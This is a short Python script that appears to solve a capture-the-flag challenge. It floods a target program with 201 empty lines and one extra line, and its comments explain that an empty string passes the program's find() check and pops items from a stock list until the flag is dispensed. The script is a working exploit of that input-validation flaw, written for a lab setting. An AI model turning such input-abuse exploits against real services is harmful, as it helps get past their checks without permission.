import sys

# Empty input: 'abcde'.find('') == 0 passes the check, stock.find('') == 0 pops the first item.
# stock has 201 items ending with 'f', so the 201st empty line dispenses the flag.
sys.stdout.write("\n" * 201 + "x\n")
sys.stdout.flush()
sys.stdin.read()
